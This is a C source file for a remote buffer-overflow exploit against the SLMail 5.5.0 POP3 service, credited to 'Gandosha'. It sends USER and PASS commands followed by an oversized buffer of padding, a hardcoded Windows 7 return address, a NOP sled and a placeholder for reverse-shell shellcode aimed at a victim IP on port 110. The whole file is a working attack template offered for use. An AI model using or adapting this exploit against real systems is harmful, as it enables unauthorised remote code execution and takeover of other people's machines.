/*SLMail 5.5.0 buffer overflaw by Gandosha*/
/*This code tested on Windows 7 Pro N 6.1.7601 SP1 Build 7601*/

#include<stdio.h>
#include<string.h> 
#include<sys/socket.h>
#include<arpa/inet.h>
#include<stdlib.h>

#define retadd "\x8f\x35\x4a\x5f" /*win7 0x5f4a358f*/
#define port 110
#define ip "<Victim's IP>"
#define message1 "USER Gandosha\r\n"
#define message2 "PASS "

/*revshell exitfunc=thread*/
char shellcode[] =
"<Shellcode>";
 
int main(int argc , char *argv[])
{
    int sock;
    struct sockaddr_in server;
    char server_reply[2000];
    char buffer[3500];
    char *off = malloc(2606);
    char *nop = malloc(16);
    char *cs = malloc(523);
    memset(off,0x41,2606);
    memset(nop,0x90,16);
    memset(cs,0x43,523);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);
    strcat(buffer, cs); 

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Gandosha.\n"); 
   
    //Create socket
    sock = socket(AF_INET , SOCK_STREAM , 0);
    if (sock == -1)
    {
        printf("Could not create socket");
    }
    puts("Socket created");
     
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
 
    //Connect to victim
    if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        perror("connect failed. Error");
        return 1;
    }
     
    puts("Connected");
    //keep communicating with server
    while(1)
    {
        //Send USER
        if( send(sock , message1 , strlen(message1) , 0) < 0)
        {
            puts("Send failed");
            return 1;
        }
         
        //Receive a reply from the server
        if( recv(sock , server_reply , 2000 , 0) < 0)
        {
            puts("recv failed");
            break;
        }
         
        puts("Server reply :");
        puts(server_reply);
	
	//Send PASS
        if( send(sock , message2 , strlen(message2) , 0) < 0)
        {
            puts("Send failed");
            return 1;
        }
         
        //Receive a reply from the server
        if( recv(sock , server_reply , 2000 , 0) < 0)
        {
            puts("recv failed");
            break;
        }
         
        puts("Server reply :");
        puts(server_reply);
	
	//Send the buffer
	if( send(sock , buffer , strlen(buffer) , 0) < 0)
        {
            puts("Send failed");
            return 1;
        }

        //Receive a reply from the server
        if( recv(sock , server_reply , 2000 , 0) < 0)
        {
            puts("recv failed");
            break;
        }
        break;
    }
     
    close(sock);
    return 0;
}






